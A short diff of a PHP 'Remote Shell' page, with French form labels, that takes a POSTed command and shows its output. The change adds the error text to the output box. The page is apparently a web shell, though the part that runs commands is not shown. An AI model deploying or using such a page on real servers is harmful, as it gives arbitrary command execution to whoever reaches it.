@@ -59,7 +59,7 @@ if(isset($_POST['command'])) {
     <title>Remote Shell</title>
 </head>
 <body>
-    <textarea id="output" rows="10" cols="50" readonly><?php echo $text_content['output']; ?></textarea>
+    <textarea id="output" rows="10" cols="50" readonly><?php echo $text_content['error']; echo $text_content['output']; ?></textarea>
     <form method="post" action="#">
     	<input type="text" id="command" name="command" placeholder="Entrer une commande">
     	<button type="submit">Envoyer la commande</button>
